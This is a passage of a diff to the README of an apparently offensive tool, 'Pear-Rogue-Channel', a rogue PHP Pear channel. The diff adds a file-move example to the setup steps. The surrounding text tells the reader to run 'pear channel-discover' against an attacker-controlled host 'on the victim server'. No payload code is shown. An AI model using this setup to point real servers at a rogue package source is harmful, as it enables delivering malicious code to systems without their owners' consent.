@@ -6,7 +6,10 @@ Pear-Rogue-Channel is a custom, self-hosted PHP Pear channel that does one thing
 ```bash
 ./main.php
 ```
-2. Move all files in `public_html` to the document root (such as `/var/www/html/`) of your web server.
+2. Move all files in `public_html` to the document root (such as `/var/www/html/`) of your web server. For instance:
+```bash
+mv -i public_html/* /var/www/html/
+```
 3. Try to execute the following pear commands on the victim server:
 ```bash
 pear channel-discover SERVER_HOST_NAME
